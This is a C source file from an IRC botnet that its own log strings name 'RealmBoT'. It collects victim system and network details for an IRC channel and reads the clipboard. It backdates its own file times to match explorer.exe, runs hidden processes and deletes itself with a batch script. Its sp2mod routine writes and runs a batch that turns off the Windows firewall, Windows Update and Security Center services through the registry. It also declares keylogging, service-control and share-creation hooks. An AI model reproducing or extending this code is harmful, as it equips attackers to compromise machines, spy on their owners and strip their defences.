#include "headers/includes.h"
#include "headers/functions.h"
#include "headers/externs.h"

char *Uptime(int startup)
{
	static char buffer[50];

	DWORD total = GetTickCount() / 1000 - startup;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;

	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

	return (buffer);
}

int OSVersionCheck(void)
{
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = OS_WIN95;
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = OS_WINNT;
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = OS_WIN98;
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = OS_WINME;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = OS_WIN2K;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = OS_WINXP;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	} else
		dwRet = OS_UNKNOWN;

	return (dwRet);
}

#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
char *sysinfo(char *sinfo, SOCKET sock)
{
	char *os="", os2[140];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD cchBuff = 256; // check this, could be sizeof CurrentUser
	char CurrentUser[256]="?";
	if(fGetUserName)
		fGetUserName(CurrentUser, &cchBuff);

	char hostname[250];
	DWORD addr = finet_addr(GetIP(sock));
	HOSTENT *hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       sprintf(hostname,hostent->h_name);
    else
		sprintf(hostname,"couldn't resolve host");

	char windir[MAX_PATH];
    GetWindowsDirectory(windir,sizeof(windir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	memset(&memstat, 0, sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	char drive[10];
	_splitpath(windir, drive, NULL, NULL, NULL);
	DKSPKB dkspkb=DiskSpaceKB(drive);

	_snprintf(sinfo, IRCLINE, "[SYSINFO]: [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [Disk]: %s total, %s free. [OS]: Windows %s (%d.%d, Build %d). [Sysdir]: %s. [Hostname]: %s (%s). [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s.",
		GetCPUSpeed(), commaI64(memstat.dwTotalPhys / 1024), commaI64(memstat.dwAvailPhys / 1024), dkspkb.TotalKB, dkspkb.FreeKB, os,
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, windir, hostname, GetIP(sock), CurrentUser, date, time, Uptime());

	return (sinfo); // return the sysinfo string
}
#endif

#ifndef NO_NETINFO

// function used for netinfo
char *netinfo(char *ninfo, char *host, SOCKET sock)
{
	DWORD n;
	char ctype[8], cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
			sprintf(ctype, "Dial-up");
	 	else
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	_snprintf(ninfo, IRCLINE, "[NETINFO]: [Type]: %s (%s). [IP Address]: %s. [Hostname]: %s.", ctype, cname, GetIP(sock), host);

	return (ninfo); // return the netinfo string
}
#endif


// globals
extern char tempdir[256];      // name of temp folder


char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found
			strncpy(temps, str, ptr - str);     // Copy first part
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	}
	return ptr;
}

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++)
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D'))
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES)
				lines[index++] = &inStr[i+1];
			else
				break;
		}
	}

	if (saveArray!=0)
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}



void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0;
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void)
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData)
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0;

	return (pinfo.dwProcessId);
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();

	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}

	return;
}
void sp2mod(void)
{
HANDLE f;
char batfile[256];
char buffer[] = "@echo off\r\n"
//"net stop \"Security Center\"\r\n"
//"net stop SharedAccess\r\n"
"Echo REGEDIT4>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters]>>%temp%\\1.reg\r\n"
"Echo \"TransportBindName\"=\"\">>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\wscsvc]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole]>>%temp%\\1.reg\r\n"
"Echo \"EnableDCOM\"=\"N\">>%temp%\\1.reg\r\n"
"Echo \"EnableRemoteConnect\"=\"N\">>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa]>>%temp%\\1.reg\r\n"
"Echo \"restrictanonymous\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\PCT1.0\\Server]>>%temp%\\1.reg\r\n"
"Echo \"Enabled\"=hex:00>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters]>>%temp%\\1.reg\r\n"
"Echo \"AutoShareWks\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"AutoShareServer\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters]>>%temp%\\1.reg\r\n"
"Echo \"NameServer\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"ForwardBroadcasts\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"IPEnableRouter\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"Domain\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"SearchList\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"UseDomainNameDevolution\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"EnableICMPRedirect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DeadGWDetectDefault\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"DontAddDefaultGatewayDefault\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnableSecurityFilters\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"AllowUnqualifiedQuery\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"PrioritizeRecordData\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"TCP1320Opts\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"KeepAliveTime\"=dword:00023280>>%temp%\\1.reg\r\n"
"Echo \"BcastQueryTimeout\"=dword:000002ee>>%temp%\\1.reg\r\n"
"Echo \"BcastNameQueryCount\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"CacheTimeout\"=dword:0000ea60>>%temp%\\1.reg\r\n"
"Echo \"Size/Small/Medium/Large\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"LargeBufferSize\"=dword:00001000>>%temp%\\1.reg\r\n"
"Echo \"SynAckProtect\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"PerformRouterDiscovery\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnablePMTUBHDetect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"FastSendDatagramThreshold \"=dword:00000400>>%temp%\\1.reg\r\n"
"Echo \"StandardAddressLength \"=dword:00000018>>%temp%\\1.reg\r\n"
"Echo \"DefaultReceiveWindow \"=dword:00004000>>%temp%\\1.reg\r\n"
"Echo \"DefaultSendWindow\"=dword:00004000>>%temp%\\1.reg\r\n"
"Echo \"BufferMultiplier\"=dword:00000200>>%temp%\\1.reg\r\n"
"Echo \"PriorityBoost\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"IrpStackSize\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo \"IgnorePushBitOnReceives\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableAddressSharing\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"AllowUserRawAccess\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableRawSecurity\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DynamicBacklogGrowthDelta\"=dword:00000032>>%temp%\\1.reg\r\n"
"Echo \"FastCopyReceiveThreshold\"=dword:00000400>>%temp%\\1.reg\r\n"
"Echo \"LargeBufferListDepth\"=dword:0000000a>>%temp%\\1.reg\r\n"
"Echo \"MaxActiveTransmitFileCount\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"MaxFastTransmit\"=dword:00000040>>%temp%\\1.reg\r\n"
"Echo \"OverheadChargeGranularity\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"SmallBufferListDepth\"=dword:00000020>>%temp%\\1.reg\r\n"
"Echo \"SmallerBufferSize\"=dword:00000080>>%temp%\\1.reg\r\n"
"Echo \"TransmitWorker\"=dword:00000020>>%temp%\\1.reg\r\n"
"Echo \"DNSQueryTimeouts\" =hex(7):31,00,00,00,32,00,00,00,32,00,00,00,34,00,00,00,38,00,00,00,30,00,00,00,00,00>>%temp%\\1.reg\r\n"
"Echo \"DefaultRegistrationTTL\"=dword:00000014>>%temp%\\1.reg\r\n"
"Echo \"DisableReplaceAddressesInConflicts\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableReverseAddressRegistrations\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"UpdateSecurityLevel \"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisjointNameSpace\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"QueryIpMatching\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"NoNameReleaseOnDemand\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"EnableDeadGWDetect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnableFastRouteLookup\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"MaxFreeTcbs\"=dword:000007d0>>%temp%\\1.reg\r\n"
"Echo \"MaxHashTableSize\"=dword:00000800>>%temp%\\1.reg\r\n"
"Echo \"SackOpts\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"Tcp1323Opts\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxDupAcks\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"TcpRecvSegmentSize\"=dword:00000585>>%temp%\\1.reg\r\n"
"Echo \"TcpSendSegmentSize\"=dword:00000585>>%temp%\\1.reg\r\n"
"Echo \"TcpWindowSize\"=dword:0007d200>>%temp%\\1.reg\r\n"
"Echo \"DefaultTTL\"=dword:00000030>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxHalfOpen\"=dword:0000004b>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxHalfOpenRetried\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo \"TcpTimedWaitDelay\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"MaxNormLookupMemory\"=dword:00030d40>>%temp%\\1.reg\r\n"
"Echo \"FFPControlFlags\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"FFPFastForwardingCacheSize\"=dword:00030d40>>%temp%\\1.reg\r\n"
"Echo \"MaxForwardBufferMemory\"=dword:00019df7>>%temp%\\1.reg\r\n"
"Echo \"MaxFreeTWTcbs\"=dword:000007d0>>%temp%\\1.reg\r\n"
"Echo \"GlobalMaxTcpWindowSize\"=dword:0007d200>>%temp%\\1.reg\r\n"
"Echo \"EnablePMTUDiscovery\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"ForwardBufferMemory\"=dword:00019df7>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]>>%temp%\\1.reg\r\n"
"Echo \"MaxConnectionsPer1_0Server\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo \"MaxConnectionsPerServer\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n""START /WAIT REGEDIT /S %temp%\\1.reg\r\n"
"DEL %temp%\\1.reg\r\n"
"DEL %0\r\n";

sprintf(batfile, "c:\\a.bat");

if ((f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0)) > (HANDLE)0)
    {
    DWORD r;
WriteFile(f, buffer, strlen(buffer), &r, NULL);
CloseHandle(f);
PROCESS_INFORMATION pinfo;
STARTUPINFO sinfo;
memset(&sinfo, 0, sizeof(STARTUPINFO));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = STARTF_USESHOWWINDOW;
sinfo.wShowWindow=SW_HIDE;
CreateProcess(NULL, batfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
}
}

int randnum(int range) {
	srand(GetTickCount());
	return (rand() % range);
}



BOOL PrivateIP(const char *ip)
{
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32];
			strncpy(ipbuf, ip, sizeof(ipbuf));
			if ((token=strtok(ipbuf, ".")) != NULL) {
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)									// Class A Private Network
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	// Class B Private Network
						|| (ip1 == 192 && ip2 == 168))				// Class C Private Network
						//|| (ip1 == 90 && ip2 == 0))					// Undefined Network Range
						return TRUE;
				}
			}
		}
	}
	return FALSE;
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0)
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);
	}

	return IP;
}

BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

BOOL FlushARPCache(void)
{
    char logbuf[LOGLINE];
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;

    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		memset((LPVOID)arp, 0, tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				sprintf(logbuf,"RealmBoT (flushdns.p.l.g) .»».  Error getting ARP cache: <%d>.",result);
				bRet = FALSE;
			}
		} else {
			sprintf(logbuf,"RealmBoT (flushdns.p.l.g) .»».  Unable to allocation ARP cache.");
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		sprintf(logbuf,"RealmBoT (flushdns.p.l.g) .»».  ARP cache is empty.");
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(logbuf,"RealmBoT (flushdns.p.l.g) .»».  Not supported by this system.");
		bRet = FALSE;
		break;
	default:
		sprintf(logbuf,"RealmBoT(flushdns.p.l.g) .»».  Error getting ARP cache: <%d>.",result);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	} else
		addlog(logbuf);
	free(arp);

	return (bRet);
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);
    }

    if (size)
        cksum += *(UCHAR*)buffer;

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);

    return (USHORT)(~cksum);
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}



// kernel32.dll function variables
SEM fSetErrorMode;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;
M32F fModule32First;
GDFSE fGetDiskFreeSpaceEx;
GLDS fGetLogicalDriveStrings;
GDT fGetDriveType;
SP fSearchPath;
QPC fQueryPerformanceCounter;
QPF fQueryPerformanceFrequency;
RSP fRegisterServiceProcess;

// user32.dll function variables
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;
#ifndef NO_KEYLOG
GAKS fGetAsyncKeyState;
GKS fGetKeyState;
GWT fGetWindowText;
GFW fGetForegroundWindow;
#endif

// advapi32.dll function variables
ROKE fRegOpenKeyEx;
RCKE fRegCreateKeyEx;
RSVE fRegSetValueEx;
RQVE fRegQueryValueEx;
RDV fRegDeleteValue;
RCK fRegCloseKey;
#ifndef NO_PROCESS
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;
#endif
#ifndef NO_NET
OSCM fOpenSCManager;
OS fOpenService;
SS fStartService;
CS fControlService;
DS fDeleteService;
CSH fCloseServiceHandle;
ESS fEnumServicesStatus;
IVSD fIsValidSecurityDescriptor;
#endif
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif

// gdi32.dll function variables
CDC fCreateDC;
CDIBS fCreateDIBSection;
CCDC fCreateCompatibleDC;
GDC fGetDeviceCaps;
GDIBCT fGetDIBColorTable;
SO fSelectObject;
BB fBitBlt;
DDC fDeleteDC;
DO fDeleteObject;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
WSAAS fWSAAsyncSelect;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
NTOHS fntohs;
NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
RECVFROM frecvfrom;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;

HANDLE ih;

// icmp.dll function variables
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif

// netapi32.dll function variables
NSA fNetShareAdd;
